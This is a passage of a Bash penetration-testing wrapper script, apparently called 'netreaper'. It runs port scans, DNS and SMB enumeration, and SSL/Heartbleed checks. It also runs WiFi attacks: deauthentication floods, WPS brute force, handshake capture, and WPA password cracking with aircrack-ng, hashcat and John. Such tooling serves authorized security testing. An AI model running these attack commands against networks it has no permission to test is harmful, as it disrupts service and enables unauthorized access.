run_nmap_udp() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_udp.txt"
    operation_header "UDP Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sU --top-ports 100 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning top 100 UDP ports..."
    nmap -sU --top-ports 100 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "UDP scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_service() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_services.txt"
    operation_header "Service Detection" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sV --version-intensity 5 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Detecting services and versions..."
    nmap -sV --version-intensity 5 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Service detection" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_rustscan() {
    check_tool "rustscan" || return 1
    local outfile="${OUTPUT_FILE}_rustscan.txt"
    operation_header "Rustscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "rustscan -a \"${TARGET}\" --ulimit 5000 -- -sV -oN \"${outfile}\""
    log_info "Scanning fast ports with rustscan..."
    rustscan -a "$TARGET" --ulimit 5000 -- -sV -oN "$outfile" | tee -a "${LOG_DIR}/rustscan.log"
    operation_summary "Rustscan" "$start_ms" "$outfile"
}

run_unicornscan() {
    check_tool "unicornscan" || return 1
    local outfile="${OUTPUT_FILE}_unicornscan.txt"
    operation_header "Unicornscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "unicornscan -Iv -p 1-65535 \"${TARGET}\""
    log_info "Scanning full port range with unicornscan..."
    unicornscan -Iv -p 1-65535 "$TARGET" | tee "$outfile"
    operation_summary "Unicornscan" "$start_ms" "$outfile"
}

run_zmap() {
    check_tool "zmap" || return 1
    require_root || return 1
    echo -ne "    ${C_GHOST}Port to scan [80]: ${C_RESET}"
    read -r zmap_port
    zmap_port="${zmap_port:-80}"
    echo -ne "    ${C_GHOST}Rate limit (pps) [10000]: ${C_RESET}"
    read -r zmap_rate
    zmap_rate="${zmap_rate:-10000}"
    local outfile="${OUTPUT_FILE}_zmap.txt"
    operation_header "Zmap" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "zmap -p \"${zmap_port}\" \"${TARGET}\" -r \"${zmap_rate}\" -o \"${outfile}\""
    log_info "Running high-speed zmap scan..."
    zmap -p "$zmap_port" "$TARGET" -r "$zmap_rate" -o "$outfile" | tee -a "${LOG_DIR}/zmap.log"
    operation_summary "Zmap" "$start_ms" "$outfile"
}

run_masscan() {
    check_tool "masscan" || return 1
    require_root || return 1
    echo -ne "    ${C_GHOST}Rate (default 10000): ${C_RESET}"
    read -r rate
    rate="${rate:-10000}"
    local outfile="${OUTPUT_FILE}_masscan.txt"
    operation_header "Masscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "masscan -p1-65535 --rate=\"${rate}\" -oL \"${outfile}\" \"${TARGET}\""
    log_info "Running masscan at rate ${rate}..."
    masscan -p1-65535 --rate="$rate" -oL "$outfile" "$TARGET" | tee -a "${LOG_DIR}/masscan.log"
    operation_summary "Masscan" "$start_ms" "$outfile"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - DISCOVERY
#═══════════════════════════════════════════════════════════════════════════════

run_arp_scan() {
    check_tool "arp-scan" || return 1
    require_root || return 1
    operation_header "ARP Scan" "local"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "arp-scan -l"
    log_info "Scanning local network with arp-scan..."
    arp-scan -l | tee -a "${LOG_DIR}/arp-scan.log"
    operation_summary "ARP scan" "$start_ms" "${LOG_DIR}/arp-scan.log"
}

run_ping_sweep() {
    check_tool "nmap" || return 1
    operation_header "Ping Sweep" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sn \"${TARGET}\""
    log_info "Sweeping hosts with nmap ping scan..."
    nmap -sn "$TARGET" | tee -a "${LOG_DIR}/discovery.log"
    operation_summary "Ping sweep" "$start_ms" "${LOG_DIR}/discovery.log"
}

run_netdiscover() {
    check_tool "netdiscover" || return 1
    require_root || return 1

    local target_input="${1:-$TARGET}"
    if [[ -z "$target_input" ]]; then
        target_input=$(get_target_input "Enter IP range (CIDR, e.g., 192.168.1.0/24)")
    fi

    local validated_target
    validated_target=$(validate_target_for_tool "$target_input" "netdiscover") || return 1
    TARGET="$validated_target"

    operation_header "Network Discovery" "$TARGET"
    start_timer_ms

    log_command_preview "netdiscover -r $TARGET -P -N"
    timeout 30 netdiscover -r "$TARGET" -P -N

    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Discovery complete" "Duration: $duration"
}

run_os_detect() {
    check_tool "nmap" || return 1
    require_root || return 1
    operation_header "OS Detection" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -O \"${TARGET}\""
    log_info "Running nmap OS detection..."
    nmap -O "$TARGET" | tee -a "${LOG_DIR}/os-detect.log"
    operation_summary "OS detection" "$start_ms" "${LOG_DIR}/os-detect.log"
}

run_p0f() {
    check_tool "p0f" || return 1
    require_root || return 1
    get_interface || return 1
    operation_header "Passive fingerprinting" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "p0f -i \"${IFACE}\""
    log_info "Starting passive fingerprinting on $IFACE (Ctrl+C to stop)"
    p0f -i "$IFACE" | tee -a "${LOG_DIR}/p0f.log"
    operation_summary "Passive fingerprinting" "$start_ms" "${LOG_DIR}/p0f.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - DNS
#═══════════════════════════════════════════════════════════════════════════════

run_dnsenum() {
    check_tool "dnsenum" || return 1
    operation_header "DNS Enum" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsenum \"${TARGET}\""
    log_info "DNS enumeration on $TARGET"
    dnsenum "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS enumeration" "$start_ms" "${LOG_DIR}/dns.log"
}

run_dnsmap() {
    check_tool "dnsmap" || return 1
    operation_header "DNS Map" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsmap \"${TARGET}\""
    log_info "DNS mapping on $TARGET"
    dnsmap "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS mapping" "$start_ms" "${LOG_DIR}/dns.log"
}

run_dnsrecon() {
    check_tool "dnsrecon" || return 1
    operation_header "DNS Recon" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsrecon -d \"${TARGET}\""
    log_info "DNS recon on $TARGET"
    dnsrecon -d "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS recon" "$start_ms" "${LOG_DIR}/dns.log"
}

run_zone_transfer() {
    operation_header "Zone transfer" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dig axfr \"${TARGET}\""
    log_info "Attempting zone transfer on $TARGET"
    dig axfr "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "Zone transfer" "$start_ms" "${LOG_DIR}/dns.log"
}

run_fierce() {
    check_tool "fierce" || return 1
    operation_header "Fierce" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "fierce --domain \"${TARGET}\""
    log_info "Subdomain brute force on $TARGET"
    fierce --domain "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "Subdomain brute force" "$start_ms" "${LOG_DIR}/dns.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - SSL
#═══════════════════════════════════════════════════════════════════════════════

run_sslscan() {
    check_tool "sslscan" || return 1
    operation_header "SSL scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "sslscan \"${TARGET}\""
    log_info "SSL scan on $TARGET"
    sslscan "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "SSL scan" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_sslyze() {
    check_tool "sslyze" || return 1
    operation_header "SSLyze" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "sslyze --regular \"${TARGET}\""
    log_info "SSLyze analysis on $TARGET"
    sslyze --regular "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "SSLyze" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_testssl() {
    if [[ -x /usr/bin/testssl.sh ]] || [[ -x /usr/bin/testssl ]]; then
        operation_header "testssl.sh" "$TARGET"
        check_target_reachable "$TARGET" || true
        local start_ms
        start_ms=$(start_timer_ms)
        log_command_preview "testssl.sh \"${TARGET}\""
        log_info "TestSSL on $TARGET"
        testssl.sh "$TARGET" 2>/dev/null || testssl "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
        operation_summary "TestSSL" "$start_ms" "${LOG_DIR}/ssl.log"
    else
        log_warning "testssl.sh not found"
        echo -e "    ${C_SHADOW}Install: git clone https://github.com/drwetter/testssl.sh${C_RESET}"
    fi
}

run_cert_info() {
    operation_header "Certificate info" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "echo | openssl s_client -connect \"${TARGET}:443\""
    log_info "Certificate info for $TARGET"
    echo | openssl s_client -connect "${TARGET}:443" 2>/dev/null | openssl x509 -noout -text | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "Certificate info" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_heartbleed() {
    check_tool "nmap" || return 1
    operation_header "Heartbleed check" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap --script ssl-heartbleed -p 443 \"${TARGET}\""
    log_attack "Heartbleed check on $TARGET"
    nmap --script ssl-heartbleed -p 443 "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "Heartbleed check" "$start_ms" "${LOG_DIR}/ssl.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - SNMP/SMB
#═══════════════════════════════════════════════════════════════════════════════

cmd_snmp_sweep() {
    check_tool "onesixtyone" || return 1
    get_target || return 1
    operation_header "SNMP sweep" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \"${TARGET}\""
    log_info "SNMP sweep on $TARGET"
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$TARGET" 2>/dev/null || \
    onesixtyone "$TARGET" public private | tee -a "${LOG_DIR}/snmp.log"
    operation_summary "SNMP sweep" "$start_ms" "${LOG_DIR}/snmp.log"
}

cmd_smb_enum() {
    get_target || return 1
    operation_header "SMB enumeration" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "SMB enumeration on $TARGET"
    
    if check_tool "enum4linux" 2>/dev/null; then
        log_command_preview "enum4linux -a \"${TARGET}\""
        enum4linux -a "$TARGET" | tee -a "${LOG_DIR}/smb.log"
    elif check_tool "smbmap" 2>/dev/null; then
        log_command_preview "smbmap -H \"${TARGET}\""
        smbmap -H "$TARGET" | tee -a "${LOG_DIR}/smb.log"
    elif check_tool "smbclient" 2>/dev/null; then
        log_command_preview "smbclient -L \"//${TARGET}\" -N"
        smbclient -L "//${TARGET}" -N | tee -a "${LOG_DIR}/smb.log"
    else
        log_error "No SMB tools found. Install: sudo apt install enum4linux smbmap smbclient"
    fi
    operation_summary "SMB enumeration" "$start_ms" "${LOG_DIR}/smb.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - WiFi
#═══════════════════════════════════════════════════════════════════════════════

cmd_monitor_mode() {
    local mode="${1:-}"
    require_root || return 1
    get_interface || return 1

    # Validate wireless interface (don't require monitor mode since we're toggling it)
    if ! validate_wireless_interface "$IFACE" false; then
        return 1
    fi

    operation_header "WiFi monitor toggle" "$IFACE"

    # Show current status
    check_monitor_mode "$IFACE" 2>/dev/null || true

    local choice
    if [[ "$mode" == "enable" ]]; then
        choice=1
    elif [[ "$mode" == "disable" ]]; then
        choice=2
    else
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Enable monitor mode"
        echo -e "    ${C_GHOST}[2]${C_RESET} Disable monitor mode"
        echo
        choice=$(get_input "Select option" "1")
    fi

    case "$choice" in
        1)
            start_timer_ms
            log_attack "Enabling monitor mode on $IFACE"
            if check_tool "airmon-ng" 2>/dev/null; then
                enable_monitor_mode "$IFACE"
            else
                log_command_preview "ip link set \"${IFACE}\" down && iw dev \"${IFACE}\" set type monitor"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type monitor
                ip link set "$IFACE" up
                check_monitor_mode "$IFACE"
            fi
            local duration
            duration=$(end_timer_ms)
            operation_summary "success" "Monitor mode enabled" "Duration: $duration"
            ;;
        2)
            start_timer_ms
            log_info "Disabling monitor mode on $IFACE"
            if check_tool "airmon-ng" 2>/dev/null; then
                disable_monitor_mode "$IFACE"
            else
                log_command_preview "ip link set \"${IFACE}\" down && iw dev \"${IFACE}\" set type managed"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type managed
                ip link set "$IFACE" up
            fi
            local duration
            duration=$(end_timer_ms)
            operation_summary "success" "Monitor mode disabled" "Duration: $duration"
            ;;
    esac
}

cmd_wifi_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    operation_header "WiFi scan" "$IFACE"
    start_timer_ms
    log_command_preview "airodump-ng \"${IFACE}\""
    log_attack "Scanning WiFi networks on $IFACE"
    echo -e "    ${C_SHADOW}Press Ctrl+C to stop${C_RESET}"
    echo
    airodump-ng "$IFACE"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "WiFi scan" "Duration: $duration"
}

cmd_wifite() {
    require_root || return 1
    check_tool "wifite" || return 1
    operation_header "Wifite" "auto"
    start_timer_ms
    log_command_preview "wifite --kill"
    log_attack "Launching Wifite"
    echo
    wifite --kill
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Wifite" "Duration: $duration"
}

cmd_deauth() {
    require_root || return 1
    check_tool "aireplay-ng" || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    local bssid
    bssid=$(get_input "Target BSSID (AP MAC)" "")
    bssid=$(sanitize_target "$bssid")
    if [[ -z "$bssid" ]] || ! is_valid_mac "$bssid"; then
        log_error "Valid BSSID required"
        return 1
    fi

    local client
    client=$(get_input "Client MAC (or 'all')" "all")
    client=$(sanitize_target "$client")
    if [[ "$client" != "all" ]] && ! is_valid_mac "$client"; then
        log_error "Client MAC must be 'all' or a valid MAC"
        return 1
    fi

    local count
    count=$(get_input "Number of deauths (0=infinite)" "10")
    
    operation_header "Deauth" "$bssid"
    start_timer_ms
    log_attack "Deauth attack: BSSID=$bssid Client=$client Count=$count"
    echo
    
    if [[ "$client" == "all" ]]; then
        log_command_preview "aireplay-ng --deauth ${count} -a ${bssid} ${IFACE}"
        aireplay-ng --deauth "$count" -a "$bssid" "$IFACE"
    else
        log_command_preview "aireplay-ng --deauth ${count} -a ${bssid} -c ${client} ${IFACE}"
        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$IFACE"
    fi
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Deauth attack" "Duration: $duration"
}

cmd_wps_attack() {
    require_root || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    local bssid
    bssid=$(get_input "Target BSSID" "")
    bssid=$(sanitize_target "$bssid")
    if [[ -z "$bssid" ]] || ! is_valid_mac "$bssid"; then
        log_error "Valid BSSID required"
        return 1
    fi

    local channel
    channel=$(get_input "Channel" "")
    channel=$(sanitize_target "$channel")
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} Reaver"
    echo -e "    ${C_GHOST}[2]${C_RESET} Bully"
    echo -e "    ${C_GHOST}[3]${C_RESET} Pixiewps (Pixie Dust)"
    echo
    local choice
    choice=$(get_input "Select attack" "1")
    
    case "$choice" in
        1)
            check_tool "reaver" || return 1
            start_timer_ms
            operation_header "Reaver WPS" "$bssid"
            log_attack "Reaver WPS attack on $bssid"
            log_command_preview "reaver -i \"${IFACE}\" -b \"${bssid}\" -c \"${channel}\" -vv"
            reaver -i "$IFACE" -b "$bssid" -c "$channel" -vv
            local duration
            duration=$(end_timer_ms)
            operation_summary "success" "Reaver WPS" "Duration: $duration"
            ;;
        2)
            check_tool "bully" || return 1
            start_timer_ms
            operation_header "Bully WPS" "$bssid"
            log_attack "Bully WPS attack on $bssid"
            log_command_preview "bully -b \"${bssid}\" -c \"${channel}\" \"${IFACE}\""
            bully -b "$bssid" -c "$channel" "$IFACE"
            local duration
            duration=$(end_timer_ms)
            operation_summary "success" "Bully WPS" "Duration: $duration"
            ;;
        3)
            check_tool "reaver" || return 1
            start_timer_ms
            operation_header "Pixie Dust" "$bssid"
            log_attack "Pixie Dust attack on $bssid"
            log_command_preview "reaver -i \"${IFACE}\" -b \"${bssid}\" -c \"${channel}\" -K 1 -vv"
            reaver -i "$IFACE" -b "$bssid" -c "$channel" -K 1 -vv
            local duration
            duration=$(end_timer_ms)
            operation_summary "success" "Pixie Dust" "Duration: $duration"
            ;;
    esac
}

cmd_handshake_capture() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    local bssid
    bssid=$(get_input "Target BSSID" "")
    bssid=$(sanitize_target "$bssid")
    if [[ -z "$bssid" ]] || ! is_valid_mac "$bssid"; then
        log_error "Valid BSSID required"
        return 1
    fi

    local channel
    channel=$(get_input "Channel" "")
    channel=$(sanitize_target "$channel")

    local outfile
    outfile=$(get_input "Output filename" "${LOOT_DIR}/handshake_$(date +%Y%m%d_%H%M%S)")
    outfile="${outfile%.*}"
    outfile="${outfile:-${LOOT_DIR}/handshake_$(date +%Y%m%d_%H%M%S)}"
    local safe_out
    safe_out=$(sanitize_filename "$outfile")
    outfile="${LOOT_DIR}/${safe_out}"
    
    operation_header "Handshake capture" "$bssid"
    start_timer_ms
    log_attack "Capturing handshake from $bssid on channel $channel"
    echo -e "    ${C_SHADOW}Waiting for handshake... (deauth clients to speed up)${C_RESET}"
    echo
    log_command_preview "airodump-ng --bssid \"${bssid}\" -c \"${channel}\" -w \"${outfile}\" \"${IFACE}\""
    airodump-ng --bssid "$bssid" -c "$channel" -w "$outfile" "$IFACE"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Handshake capture" "Output: ${outfile}.cap\nDuration: $duration"
}

cmd_channel_hop() {
    require_root || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    log_info "Channel hopping on $IFACE (Ctrl+C to stop)"
    echo

    while true; do
        for ch in 1 2 3 4 5 6 7 8 9 10 11; do
            iw dev "$IFACE" set channel "$ch" 2>/dev/null || iwconfig "$IFACE" channel "$ch" 2>/dev/null
            printf "\r    ${C_GHOST}Channel: ${C_VENOM}%2d${C_RESET}" "$ch"
            sleep 0.3
        done
    done
}

cmd_client_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1

    # Validate wireless interface and require monitor mode
    if ! validate_wireless_interface "$IFACE" true; then
        return 1
    fi

    local bssid
    bssid=$(get_input "Target BSSID" "")
    bssid=$(sanitize_target "$bssid")
    if [[ -z "$bssid" ]] || ! is_valid_mac "$bssid"; then
        log_error "Valid BSSID required"
        return 1
    fi

    local channel
    channel=$(get_input "Channel" "")
    channel=$(sanitize_target "$channel")
    
    log_info "Scanning clients on $bssid"
    echo
    start_timer_ms
    log_command_preview "airodump-ng --bssid \"${bssid}\" -c \"${channel}\" \"${IFACE}\""
    airodump-ng --bssid "$bssid" -c "$channel" "$IFACE"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Client scan" "Duration: $duration"
}

cmd_hidden_ssid() {
    log_info "To reveal hidden SSID:"
    echo
    echo -e "    ${C_GHOST}1.${C_RESET} Start airodump-ng to find hidden network (shows <length: X>)"
    echo -e "    ${C_GHOST}2.${C_RESET} Note the BSSID and channel"
    echo -e "    ${C_GHOST}3.${C_RESET} Run deauth attack to force client reconnection"
    echo -e "    ${C_GHOST}4.${C_RESET} SSID will appear in airodump when client reconnects"
    echo
    echo -e "    ${C_SHADOW}Use options [7] WiFi Recon then [8] Deauth Attack${C_RESET}"
}

cmd_signal_check() {
    get_interface || return 1
    operation_header "Signal check" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    
    if check_tool "wavemon" 2>/dev/null; then
        log_command_preview "wavemon -i \"${IFACE}\""
        wavemon -i "$IFACE"
    else
        log_info "Signal info for $IFACE"
        log_command_preview "iwconfig \"${IFACE}\""
        echo
        iwconfig "$IFACE" 2>/dev/null || iw dev "$IFACE" link
    fi
    operation_summary "Signal check" "$start_ms" "${LOG_DIR}/wifi_signal.log"
}

cmd_aircrack_dict() {
    check_tool "aircrack-ng" || return 1
    local capfile
    capfile=$(get_input "Capture file (.cap/.pcapng)" "")
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }

    local wordlist
    wordlist=$(get_input "Wordlist" "/usr/share/wordlists/rockyou.txt")
    operation_header "Aircrack dictionary" "$capfile"
    start_timer_ms
    log_attack "Aircrack-ng dictionary attack on $capfile"
    log_command_preview "aircrack-ng -w \"${wordlist}\" \"${capfile}\""
    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Aircrack dictionary" "Duration: $duration"
}

cmd_aircrack_wordlist() {
    check_tool "aircrack-ng" || return 1
    local capfile
    capfile=$(get_input "Capture file (.cap/.pcapng)" "")
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }

    local wordlist
    wordlist=$(get_input "Custom wordlist" "")
    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
    operation_header "Aircrack custom" "$capfile"
    start_timer_ms
    log_attack "Aircrack-ng custom wordlist on $capfile"
    log_command_preview "aircrack-ng -w \"${wordlist}\" \"${capfile}\""
    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Aircrack custom" "Duration: $duration"
}

cmd_convert_hashcat() {
    local converter=""
    if command -v hcxpcapngtool &>/dev/null; then
        converter="hcxpcapngtool"
    elif command -v cap2hccapx &>/dev/null; then
        converter="cap2hccapx"
    fi
    [[ -z "$converter" ]] && { log_error "hcxpcapngtool or cap2hccapx required"; return 1; }

    local capfile="${1:-}"
    if [[ -z "$capfile" ]]; then
        capfile=$(get_input "Capture file (.cap/.pcapng)" "")
    fi
    capfile=$(strip_ansi "$capfile")
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }

    mkdir -p "$LOOT_DIR"
    local base_name
    base_name="$(basename "$capfile")"
    local out_file
    local safe_base
    safe_base=$(sanitize_filename "${base_name%.*}")
    out_file="${LOOT_DIR}/${safe_base}_$(date +%Y%m%d_%H%M%S).hc22000"

    if [[ "$converter" == "hcxpcapngtool" ]]; then
        log_info "Converting with hcxpcapngtool"
        log_command_preview "hcxpcapngtool -o \"${out_file}\" \"${capfile}\""
        hcxpcapngtool -o "$out_file" "$capfile"
    else
        out_file="${out_file%.hc22000}.hccapx"
        log_info "Converting with cap2hccapx"
        log_command_preview "cap2hccapx \"${capfile}\" \"${out_file}\""
        cap2hccapx "$capfile" "$out_file"
    fi

    log_loot "Converted hash saved: $out_file"
    echo "$out_file"
}

cmd_hashcat_gpu() {
    check_tool "hashcat" || return 1
    local capfile
    capfile=$(get_input "Capture/hash file (.cap/.hc22000/.hccapx)" "")
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    local hashfile="$capfile"
    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
    fi
    local wordlist
    wordlist=$(get_input "Wordlist" "/usr/share/wordlists/rockyou.txt")
    operation_header "Hashcat GPU" "$hashfile"
    start_timer_ms
    log_attack "Hashcat GPU attack on $hashfile"
    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" --status --status-timer=15 --potfile-path \"${LOG_DIR}/hashcat.pot\" --session netreaper"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Hashcat GPU" "Duration: $duration"
}

cmd_hashcat_rules() {
    check_tool "hashcat" || return 1
    local capfile
    capfile=$(get_input "Capture/hash file (.cap/.hc22000/.hccapx)" "")
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    local hashfile="$capfile"
    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
    fi
    local wordlist
    wordlist=$(get_input "Wordlist" "")
    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
    local rules
    rules=$(get_input "Rules file" "/usr/share/hashcat/rules/best64.rule")
    operation_header "Hashcat rules" "$hashfile"
    start_timer_ms
    log_attack "Hashcat rules attack on $hashfile using $rules"
    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" -r \"${rules}\" --status --status-timer=15 --potfile-path \"${LOG_DIR}/hashcat.pot\" --session netreaper"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Hashcat rules" "Duration: $duration"
}

cmd_john_the_ripper() {
    check_tool "john" || return 1
    check_tool "hccap2john" || return 1
    local capfile
    capfile=$(get_input "Capture/hash file (.cap/.hccapx/.hc22000)" "")
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    local wordlist
    wordlist=$(get_input "Wordlist" "/usr/share/wordlists/rockyou.txt")

    local john_hash
    john_hash="${LOOT_DIR}/john_$(date +%Y%m%d_%H%M%S).hash"
    hccap2john "$capfile" > "$john_hash"
    operation_header "John the Ripper" "$capfile"
    start_timer_ms
    log_attack "John the Ripper on $john_hash"
    log_command_preview "john --wordlist=\"${wordlist}\" \"${john_hash}\""
    john --wordlist="$wordlist" "$john_hash" | tee -a "${LOG_DIR}/john.log"
    john --show "$john_hash" | tee -a "${LOG_DIR}/john.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "John the Ripper" "Duration: $duration"
}

cmd_cowpatty() {
    check_tool "cowpatty" || return 1
    local capfile
    capfile=$(get_input "Capture file (.cap)" "")
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
    local ssid
    ssid=$(get_input "SSID" "")
    [[ -z "$ssid" ]] && { log_error "SSID required"; return 1; }
    local wordlist
    wordlist=$(get_input "Wordlist" "/usr/share/wordlists/rockyou.txt")
    operation_header "Cowpatty" "$ssid"
    start_timer_ms
    log_attack "Cowpatty WPA crack on $ssid"
    log_command_preview "cowpatty -r \"${capfile}\" -s \"${ssid}\" -f \"${wordlist}\" -2"
    cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 | tee -a "${LOG_DIR}/cowpatty.log"
    local duration
    duration=$(end_timer_ms)
    operation_summary "success" "Cowpatty" "Duration: $duration"
}

cmd_bettercap_wifi() {
    require_root || return 1
    check_tool "bettercap" || return 1
    get_interface || return 1
    local log_file
    log_file="${LOG_DIR}/bettercap_${IFACE}_$(date +%Y%m%d_%H%M%S).log"
    operation_header "Bettercap WiFi" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Bettercap WiFi recon on $IFACE"
